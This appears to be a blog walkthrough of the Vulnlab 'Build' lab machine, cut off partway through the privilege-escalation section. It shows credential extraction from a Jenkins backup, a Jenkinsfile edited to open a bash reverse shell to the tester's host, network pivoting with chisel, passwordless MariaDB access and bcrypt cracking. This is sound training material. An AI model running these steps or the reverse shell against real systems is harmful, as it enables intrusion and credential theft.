---
layout: single
title:  "Vulnlab - Build"
date:   2024-05-11 00:00:00 +0200
categories: vulnlab
permalink: "/vulnlab-build"
excerpt: "Build is an easy difficulty machine on Vulnlab created by xct."
---

{{ page.excerpt }}

Note: In some commands `$T` is a variable I set to the IP address of the box for convenience.

## nmap

```shell
└─$ sudo nmap $T -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 02:54 CEST
Nmap scan report for 10.10.110.113
Host is up (0.018s latency).
Not shown: 65526 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
53/tcp   open     domain
512/tcp  open     exec
513/tcp  open     login
514/tcp  open     shell
873/tcp  open     rsync
3000/tcp open     ppp
3306/tcp filtered mysql
8081/tcp filtered blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 12.18 seconds
```

```shell
└─$ sudo nmap $T -p22,53,512,513,514,873,3000,3306,8081 -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 02:55 CEST
Nmap scan report for 10.10.110.113
Host is up (0.016s latency).

PORT     STATE    SERVICE         VERSION
22/tcp   open     ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 47:21:73:e2:6b:96:cd:f9:13:11:af:40:c8:4d:d6:7f (ECDSA)
|_  256 2b:5e:ba:f3:72:d3:b3:09:df:25:41:29:09:f4:7b:f5 (ED25519)
53/tcp   open     domain          PowerDNS
| dns-nsid:
|   NSID: pdns (70646e73)
|_  id.server: pdns
512/tcp  open     exec            netkit-rsh rexecd
513/tcp  open     login?
514/tcp  open     shell           Netkit rshd
873/tcp  open     rsync           (protocol version 31)
3000/tcp open     ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=a0285e2f06743226; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=6Xp_2QkM_cqQHknI0013-qqdVgs6MTcxNTMwMjU1MzUwNjU0MTkyOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 10 May 2024 00:55:53 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=ae55eb9bb2f0a015; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=v_dd3F7k2GXRYdJ_K_4kw4-rXvA6MTcxNTMwMjU1ODYyMjA5ODUzOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 10 May 2024 00:55:58 GMT
|_    Content-Length: 0
3306/tcp filtered mysql
8081/tcp filtered blackice-icecap
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=5/10%Time=663D7096%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,14C8,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=a0285e2f06743226;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=6Xp_2QkM_cqQHknI0013-qqdVgs6MTcxNTMwMjU1MzUwNjU0MTkyOQ;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2010\x20May\x202024\x2000:55:53\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x
SF:20cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:
SF:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHR
SF:lYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3Rhcn
SF:RfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6L
SF:y9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5n
SF:Iiwic2l6ZXMiOiI1MTJ")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Me
SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS
SF:et-Cookie:\x20i_like_gitea=ae55eb9bb2f0a015;\x20Path=/;\x20HttpOnly;\x2
SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=v_dd3F7k2GXRYdJ_K_4kw4-rXvA6MTcxN
SF:TMwMjU1ODYyMjA5ODUzOQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam
SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2010\x20M
SF:ay\x202024\x2000:55:58\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.72 seconds
```

Aside from the usual SSH service at port 22 there are a lot of interesting ports.

First there's a DNS server at port 53 using [PowerDNS](https://www.powerdns.com/).

For port 512 to 514, this [Wikipedia page](https://en.wikipedia.org/wiki/Berkeley_r-commands) gives a good overview. They belong to `rexec`(port 512), `rlogin` (port 513) and `rsh` (port 514), an old suite of programs allowing remote alogin and command execution before modern SSH existed. They are considered insecure now and have been largely replaced by SSH.

There's a [rsync](https://en.wikipedia.org/wiki/Rsync) server at port 873 which is for synchronizing directories and files between computers.

A [Gitea](https://about.gitea.com/) instance is running on port 3000. It's like self-hosted GitHub.

Finally port 3306 and port 8081 are filtered, which means they are likely listening internally but not reachable from the outside. I'll make sure to check them if I can get shell access to the target. Port 3306 is the default port for MySQL.

## Initial recon (port 512-514)

HackTricks has articles on [rexec](https://book.hacktricks.xyz/network-services-pentesting/512-pentesting-rexec), [rlogin](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rlogin) and [rsh](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rsh).

These commands are not installed by default on my updated Kali and it seems I need to install the `rsh-client` package. However it was not available when I tried to install from `apt` and after searching through the packages it seems to have been replaced by `rsh-redone-client` for the default Kali repository:

```shell
└─$ sudo apt list rsh*   
Listing... Done
rsh-redone-client/kali-rolling,now 85-4 amd64 [installed]
rsh-redone-client/kali-rolling 85-4 i386
rsh-redone-server/kali-rolling 85-4 amd64
rsh-redone-server/kali-rolling 85-4 i386
```

I could then install it:

```shell
└─$ sudo apt install rsh-redone-client
```

Another alternative that I found from a [forum thread](https://forums.kali.org/showthread.php?41905-Cannot-rlogin-apt-get-install-rsh-client-gt-openssh-client-installed-instead) is to grab the package from the Debian repository [here](http://http.us.debian.org/debian/pool/main/n/netkit-rsh/) and install it manually.

```shell
└─$ curl -sO http://http.us.debian.org/debian/pool/main/n/netkit-rsh/rsh-client_0.17-24_amd64.deb && sudo dpkg -i rsh-client_0.17-24_amd64.deb
```

I then tried to login to the target but it asked for a password. Guessing some users and passwords didn't work.

```shell
└─$ rlogin root@$T                 
Password: 
```

```shell
└─$ rsh root@$T       
Password: 
```

## Gitea (unauthenticated)

<http://10.10.111.70:3000/>

![alt text](../assets/vulnlab/machines/build/img/image.png)

There's one user, `buildadm`.

<http://10.10.111.70:3000/explore/users>

![alt text](../assets/vulnlab/machines/build/img/image-1.png)

There's a publicly readable repository, `buildadm/dev`.

<http://10.10.111.70:3000/explore/repos>

![alt text](../assets/vulnlab/machines/build/img/image-2.png)

The repository contains only one file, `Jenkinsfile`.

<http://10.10.111.70:3000/buildadm/dev>

![alt text](../assets/vulnlab/machines/build/img/image-3.png)

It defines a [Jenkins pipeline](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/) that does nothing.

```
pipeline {
    agent any

    stages {
        stage('Do nothing') {
            steps {
                sh '/bin/true'
            }
        }
    }
}
```

This indicates the target is using [Jenkins](https://www.jenkins.io/), an automation server for CI/CD. We didn't find any externally accessible Jenkins web interface so it's likely deployed internally.

There's a nice article on [HackTricks Cloud](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security) that explains the basics of Jenkins and its security, as well as this [GitHub repository](https://github.com/gquere/pwn_jenkins).

The section about [pipeline exploitation](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security#build-pipelines) is interesting for us:

![alt text](../assets/vulnlab/machines/build/img/image-4.png)

![alt text](../assets/vulnlab/machines/build/img/image-5.png)

This implies that we could try to edit the `Jenkinsfile` to include a reverse shell and push to the repository to trigger the pipeline and get a shell on the Jenkins server. However as an unauthenticated user this repository is read-only. I'll make sure to try this attack if I get credentials to login to Gitea.

## rsync

Let's see if we can [read some shares](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync) without credentials.

```shell
└─$ rsync -av --list-only rsync://$T        
backups         backups
```

```shell
└─$ rsync -av --list-only rsync://$T/backups
receiving incremental file list
drwxr-xr-x          4,096 2024/05/02 15:26:31 .
-rw-r--r--    376,289,280 2024/05/02 15:26:19 jenkins.tar.gz

sent 24 bytes  received 82 bytes  212.00 bytes/sec
total size is 376,289,280  speedup is 3,549,898.87
```

There's a `backups` share with a file, `jenkins.tar.gz`. Let's fetch it. The file is 359MB so it will take some time.

```shell
└─$ rsync -av rsync://$T/backups ./backups
receiving incremental file list
created directory ./backups
./
jenkins.tar.gz

sent 50 bytes  received 376,381,276 bytes  6,781,645.51 bytes/sec
total size is 376,289,280  speedup is 1.00
```

After extracting it seems to be a backup of all the Jenkins configuration and data.

```shell
└─$ tar -xf jenkins.tar.gz && rm jenkins.tar.gz
```

```shell
└─$ ls -a jenkins_configuration
.                                                                           jenkins.model.JenkinsLocationConfiguration.xml
..                                                                          jenkins.security.ResourceDomainConfiguration.xml
caches                                                                      jenkins.tasks.filters.EnvVarsFilterGlobalConfiguration.xml
com.cloudbees.hudson.plugins.folder.config.AbstractFolderConfiguration.xml  jenkins.telemetry.Correlator.xml
.config                                                                     jobs
config.xml                                                                  .lastStarted
copy_reference_file.log                                                     logs
fingerprints                                                                nodeMonitors.xml
.groovy                                                                     nodes
hudson.model.UpdateCenter.xml                                               org.jenkinsci.plugin.gitea.servers.GiteaServers.xml
hudson.plugins.build_timeout.global.GlobalTimeOutConfiguration.xml          org.jenkinsci.plugins.displayurlapi.DefaultDisplayURLProviderGlobalConfiguration.xml
hudson.plugins.build_timeout.operations.BuildStepOperation.xml              org.jenkinsci.plugins.workflow.flow.FlowExecutionList.xml
hudson.plugins.git.GitSCM.xml                                               org.jenkinsci.plugins.workflow.flow.GlobalDefaultFlowDurabilityLevel.xml
hudson.plugins.git.GitTool.xml                                              org.jenkinsci.plugins.workflow.libs.GlobalLibraries.xml
hudson.plugins.timestamper.TimestamperConfig.xml                            .owner
hudson.tasks.Mailer.xml                                                     plugins
hudson.tasks.Shell.xml                                                      queue.xml.bak
hudson.triggers.SCMTrigger.xml                                              secret.key
identity.key.enc                                                            secret.key.not-so-secret
io.jenkins.plugins.junit.storage.JunitTestResultStorageConfiguration.xml    secrets
.java                                                                       updates
jenkins.fingerprints.GlobalFingerprintConfiguration.xml                     userContent
jenkins.install.InstallUtil.lastExecVersion                                 users
jenkins.install.UpgradeWizard.state                                         war
jenkins.model.ArtifactManagerConfiguration.xml                              workspace
jenkins.model.GlobalBuildDiscarderConfiguration.xml
```

## Dumping Jenkins secrets

This [section](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security#jenkins-secrets) on HackTricks explains how we can dump all the credentials and secrets from Jenkins having access to the server files.

We find one encrypted password:

```shell
└─$ grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
jenkins_configuration/jobs/build/config.xml:              <password>{AQAAABAAAA<REDACTED>FEMRLZ9v0=}</password>
```

It's for the user `buildadm`, the same username we found on Gitea:

```shell
└─$ cat jenkins_configuration/jobs/build/config.xml
...
    <com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider_-FolderCredentialsProperty plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain plugin="credentials@1337.v60b_d7b_c7b_c9f">
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl plugin="credentials@1337.v60b_d7b_c7b_c9f">
              <id>e4048737-7acd-46fd-86ef-a3db45683d4f</id>
              <description></description>
              <username>buildadm</username>
              <password>{AQAAABAAAA<REDACTED>FEMRLZ9v0=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider_-FolderCredentialsProperty>
...
```

Now we can use [this script](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) to decrypt it:

```shell
└─$ wget https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py
```

```shell
└─$ python3 jenkins_offline_decrypt.py jenkins_configuration/secrets/master.key jenkins_configuration/secrets/hudson.util.Secret jenkins_configuration/jobs/build/config.xml 
<REDACTED>
```

We get the plaintext password for the user `buildadm`.

We can also get info on the users in Jenkins. There's only one user, `admin`:

```shell
└─$ cat jenkins_configuration/users/users.xml                                                             
<?xml version='1.1' encoding='UTF-8'?>
<hudson.model.UserIdMapper>
  <version>1</version>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>admin</string>
      <string>admin_8569439066427679502</string>
    </entry>
  </idToDirectoryNameMap>
</hudson.model.UserIdMapper>
```

```shell
└─$ cat jenkins_configuration/users/admin_8569439066427679502/config.xml | grep -i 'fullname\|pass\|email'
  <fullName>admin</fullName>
      <passwordHash>#jbcrypt:$2a$10$PaX<REDACTED></passwordHash>
      <emailAddress>admin@build.vl</emailAddress>
```

I couldn't crack the password hash. However we get an email: `admin@build.vl`. We can add the `build.vl` domain to `/etc/hosts`.

```shell
└─$ echo "$T build.vl" | sudo tee -a /etc/hosts                        
10.10.110.113 build.vl
```

## Gitea (as buildadm)

We can login as `buildadm` with the password we just found.

<http://build.vl:3000/user/login>

![alt text](../assets/vulnlab/machines/build/img/image-6.png)

Since we are the owner we now have full access to the `buildadm/dev` repository.

<http://build.vl:3000/buildadm/dev>

We can now try to perform the attack mentioned earlier by editing the `Jenkinsfile`. But first we can check if the Jenkins instance is indeed listening for changes in the repository by navigating to *Settings &rarr; Webhooks*.

<http://build.vl:3000/buildadm/dev/settings/hooks>

![alt text](../assets/vulnlab/machines/build/img/image-7.png)

<http://build.vl:3000/buildadm/dev/settings/hooks/1>

![alt text](../assets/vulnlab/machines/build/img/image-8.png)

There's a webhook that triggers on push events and makes a POST request to `http://172.18.0.3:8080/gitea-webhook/post`. The `172.18.0.0/16` is a private address range also used by [Docker networks](https://docs.storagemadeeasy.com/appliance/docker_networking), so it's possible that the Jenkins instance is running on a Docker container with IP address `172.18.0.3`. We'll confirm this later after we get a reverse shell.

Now we can edit the `Jenkinsfile` directly from the Gitea web interface at <http://build.vl:3000/buildadm/dev/_edit/main/Jenkinsfile> and [add a reverse shell](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-pipeline) to it:

```
pipeline {
    agent any

    stages {
        stage('Pwned') {
            steps {
                sh '''
                    bash -c 'bash -i >& /dev/tcp/10.8.1.246/1337 0>&1'
                '''
            }
        }
    }
}
```

After starting a `nc` listener and clicking on *Commit Changes*, we get a shell after a minute or two:

```shell
└─$ ncl          
listening on [any] 1337 ...
connect to [10.8.1.246] from (UNKNOWN) [10.10.70.114] 39568
bash: cannot set terminal process group (7): Inappropriate ioctl for device
bash: no job control in this shell
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# 
```

Then we can upgrade and stabilize the shell with [these steps](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys#script).

We find the user flag under `/root`:

```shell
root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# cd /root
root@5ac6c7d6fb8e:~# ls -la
total 20
drwxr-xr-x 3 root root 4096 May  2 09:43 .
drwxr-xr-x 1 root root 4096 May  9 18:50 ..
lrwxrwxrwx 1 root root    9 May  1 14:37 .bash_history -> /dev/null
-r-------- 1 root root   35 May  1 17:37 .rhosts
drwxr-xr-x 2 root root 4096 May  1 16:05 .ssh
-rw------- 1 root root   37 May  1 14:29 user.txt
root@5ac6c7d6fb8e:~# cat user.txt
VL{<REDACTED>}
```

The `.ssh` folder contains a private key but I couldn't use it to login to the host. The `.rhosts` file will be important later.

## Pivoting from the Jenkins container

The random hex hostname and the presence of the `/.dockerenv` file confirms that we are inside a Docker container.

```shell
root@5ac6c7d6fb8e:~# ls -a /
.  ..  .dockerenv  bin  boot  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

Given the use of Docker networking we can try to enumerate the network further to see if we can reach other containers or the host (our target running Docker) itself. We already know that our current IP address is `172.18.0.3`. Since it's a Docker container many commands like `ip` are not installed, but we can read the information directly from `/proc/net`.

Here's the routing table:

```shell
root@5ac6c7d6fb8e:~# cat /proc/net/route
Iface   Destination     Gateway         Flags   RefCnt  Use     Metric  Mask            MTU     Window  IRTT                                                       
eth0    00000000        010012AC        0003    0       0       0       00000000        0       0       0                                                                               
eth0    000012AC        00000000        0001    0       0       0       0000FFFF        0       0       0
```

This [blog post](https://blog.oddbit.com/post/2015-03-08-converting-hexadecimal-ip-addr/) explains that the addresses are in little-endian and hex. By converting we find out that the default gateway is `172.18.0.1` and that the subnet used is `172.18.0.0./16`. We can deduce that `172.18.0.1` is the Docker host and that the containers have IP addresses starting from `172.18.0.2`.

In the `nmap` scan we found that port 3306 and 8081 were filtered, but we may be able to reach them now that we're inside the internal Docker subnet. Let's check:

```shell
root@5ac6c7d6fb8e:~# cat < /dev/tcp/172.18.0.1/3306
i
11.3.2-MariaDB-1:11.3.2+maria~ubu2204?qNsy&M4Z-I><Re'2by\=^mysql_native_password^Z
[3]+  Stopped                 cat < /dev/tcp/172.18.0.1/3306
```

```shell
root@5ac6c7d6fb8e:~# curl http://172.18.0.1:8081 -I
HTTP/1.1 401 Unauthorized
Transfer-Encoding: chunked
Connection: close
Content-Type: text/plain; charset=utf-8
Www-Authenticate: Basic realm="PowerDNS"
```

We can indeed reach them now. There's the [PowerDNS webserver](https://doc.powerdns.com/authoritative/http-api/index.html) listening on port 8081 protected with basic auth but we'll not end up using it to solve the box. However the MariaDB listening on port 3306 is interesting and to be able to use tools and reach it from Kali I'll use [chisel](https://github.com/jpillora/chisel) to setup a SOCKS proxy.

We can get the latest `linux_amd64` binary from [Releases](https://github.com/jpillora/chisel/releases/tag/v1.9.1) and transfer it to the Jenkins container:

```shell
└─$ python3 -m uploadserver 80
File upload available at /upload
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.70.114 - - [10/May/2024 20:24:54] "GET /chisel HTTP/1.1" 200 -
```

```shell
root@5ac6c7d6fb8e:~# curl http://10.8.1.246/chisel -sO
root@5ac6c7d6fb8e:~# chmod +x chisel
```

Then [setup the SOCKS proxy](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel#bkmrk-reverse-dynamic-sock):

```shell
└─$ ./chisel server --reverse --port 54321
2024/05/10 20:26:24 server: Reverse tunnelling enabled
2024/05/10 20:26:24 server: Fingerprint BN1Cwtq8UN7diBlk7ATLnIfRGIHB1gGthlCdXLloUJ8=
2024/05/10 20:26:24 server: Listening on http://0.0.0.0:54321
2024/05/10 20:27:32 server: session#1: tun: proxy#R:127.0.0.1:9050=>socks: Listening
```

```shell
root@5ac6c7d6fb8e:~# ./chisel client 10.8.1.246:54321 R:9050:socks &
[2] 3271
root@5ac6c7d6fb8e:~# 2024/05/10 18:27:34 client: Connecting to ws://10.8.1.246:54321
2024/05/10 18:27:35 client: Connected (Latency 20.801339ms)
```

I added a line to `/etc/proxychains4.conf` to be able to use `proxychains`:

```
socks5 127.0.0.1 9050
```

I could then reach the Docker subnet from Kali including the host:

```shell
└─$ proxychains -q nmap 172.18.0.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 20:41 CEST
Nmap scan report for 172.18.0.1
Host is up (0.053s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
873/tcp  open  rsync
3000/tcp open  ppp
3306/tcp open  mysql
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 51.93 seconds
```

## PowerDNS

Trying to login to MariaDB as root without a password works:

```shell
└─$ proxychains -q mysql -h 172.18.0.1 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 63
Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

There's a non-default database, `powerdnsadmin` used by PowerDNS:

```shell
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| powerdnsadmin      |
| sys                |
+--------------------+
5 rows in set (0.017 sec)
```

```shell
MariaDB [(none)]> use powerdnsadmin;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```shell
MariaDB [powerdnsadmin]> show tables;
+-------------------------+
| Tables_in_powerdnsadmin |
+-------------------------+
| account                 |
| account_user            |
| alembic_version         |
| apikey                  |
| apikey_account          |
| comments                |
| cryptokeys              |
| domain                  |
| domain_apikey           |
| domain_setting          |
| domain_template         |
| domain_template_record  |
| domain_user             |
| domainmetadata          |
| domains                 |
| history                 |
| records                 |
| role                    |
| sessions                |
| setting                 |
| supermasters            |
| tsigkeys                |
| user                    |
+-------------------------+
23 rows in set (0.017 sec)
```

We can read all the DNS records:

```shell
MariaDB [powerdnsadmin]> select * from records;
+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+
| id | domain_id | name                 | type | content                                                                                  | ttl  | prio | disabled | ordername | auth |
+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+
|  8 |         1 | db.build.vl          | A    | 172.18.0.4                                                                               |   60 |    0 |        0 | NULL      |    1 |
|  9 |         1 | gitea.build.vl       | A    | 172.18.0.2                                                                               |   60 |    0 |        0 | NULL      |    1 |
| 10 |         1 | intern.build.vl      | A    | 172.18.0.1                                                                               |   60 |    0 |        0 | NULL      |    1 |
| 11 |         1 | jenkins.build.vl     | A    | 172.18.0.3                                                                               |   60 |    0 |        0 | NULL      |    1 |
| 12 |         1 | pdns-worker.build.vl | A    | 172.18.0.5                                                                               |   60 |    0 |        0 | NULL      |    1 |
| 13 |         1 | pdns.build.vl        | A    | 172.18.0.6                                                                               |   60 |    0 |        0 | NULL      |    1 |
| 14 |         1 | build.vl             | SOA  | a.misconfigured.dns.server.invalid hostmaster.build.vl 2024050201 10800 3600 604800 3600 | 1500 |    0 |        0 | NULL      |    1 |
+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+
7 rows in set (0.019 sec)
```

The `172.18.0.0/16` Docker network has hosts from `172.18.0.1` to `172.18.0.6`.

`intern.build.vl` is the host, `gitea.build.vl` is the Gitea container and `jenkins.build.vl` is the Jenkins container on which we got a reverse shell.

We can port scan `db.build.vl`, `pdns-worker.build.vl` and `pdns.build.vl` to confirm what they are:

```shell
└─$ proxychains -q nmap 172.18.0.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 20:45 CEST
Nmap scan report for 172.18.0.4
Host is up (0.052s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 53.75 seconds
```

This is the MariaDB instance we just got into, the port 3306 is just forwarded to the host so that we can reach it both at `172.18.0.1` and `172.18.0.4`.

```shell
└─$ proxychains -q nmap 172.18.0.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 20:46 CEST
Nmap scan report for 172.18.0.5
Host is up (0.052s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 53.28 seconds
```

This is the PowerDNS instance with the webserver, also port-forwarded to the host.

```shell
└─$ proxychains -q nmap 172.18.0.6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 20:47 CEST
Nmap scan report for 172.18.0.6
Host is up (0.052s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 52.86 seconds
```

This one is interesting since we didn't find any port 80 in our `nmap` scan. I browsed to it on Firefox after configuring [FoxyProxy](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-standard/) so that it uses the SOCKS proxy at port 9050.

<http://172.18.0.6/login>

![alt text](../assets/vulnlab/machines/build/img/image-9.png)

It's a [web interface for administering PowerDNS](https://github.com/PowerDNS-Admin/PowerDNS-Admin), which is different from the webserver on port 8081 we saw previously.

In the database there's a hash for the user `admin`:

```shell
MariaDB [powerdnsadmin]> select username,password,email from user;
+----------+--------------------------------------------------------------+----------------+
| username | password                                                     | email          |
+----------+--------------------------------------------------------------+----------------+
| admin    | $2b$12$s1hK0o7YNkJGfu5poWx<REDACTED>                         | admin@build.vl |
+----------+--------------------------------------------------------------+----------------+
1 row in set (0.016 sec)
```

It cracks with `rockyou.txt` and hashcat mode 3200 after a short time:

```shell
└─$ hashcat -a0 -m3200 '$2b$12$s1hK0o7YNkJGfu5poWx<REDACTED>' /usr/share/wordlists/rockyou.txt
...
$2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq:<REDACTED>
```

We can then login to the web interface with the cracked password as `admin` and fully administer the DNS server:

<http://172.18.0.6/dashboard/>

![alt text](../assets/vulnlab/machines/build/img/image-10.png)

We can edit the DNS records from the web interface, for example:

<http://172.18.0.6/domain/build.vl>

![alt text](../assets/vulnlab/machines/build/img/image-11.png)

However we have yet to find a way to abuse this.

## .rhosts

The `/root/.rhosts` we found on the Jenkins container has two lines:

```
admin.build.vl +
intern.build.vl +
```

Searching on the Internet we can find a lot of documentation that explains the purpose and syntax of the `.rhosts` file, like [this one](https://docs.oracle.com/cd/E36784_01/html/E36882/rhosts-4.html).

![alt text](../assets/vulnlab/machines/build/img/image-12.png)

![alt text](../assets/vulnlab/machines/build/img/image-13.png)

It's a configuration file for the `rlogin` and `rsh` services we inspected at the beginning. By port scanning `172.18.0.1` through `172.18.0.6` we will notice that the ports 512 to 514 are only open on `172.18.0.1`, which means that these services are likely only installed directly on the host and not inside a Docker container (just like the SSH service). So why did we find it inside the Jenkins container?

```shell
